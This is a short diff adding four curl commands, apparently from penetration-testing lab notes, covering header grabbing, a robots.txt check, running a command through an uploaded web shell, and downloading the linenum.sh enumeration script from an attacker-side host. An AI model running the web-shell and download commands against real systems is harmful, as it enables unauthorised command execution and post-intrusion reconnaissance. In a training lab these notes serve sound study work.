@@ -1,0 +1,4 @@
+- `curl -IL https://www.inlanefreight.com` – Grab headers  
+- `curl 10.10.10.121/robots.txt` – Check for robots.txt  
+- `curl http://SERVER_IP:PORT/shell.php?cmd=id` – Execute webshell  
+- `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh` – Download file  
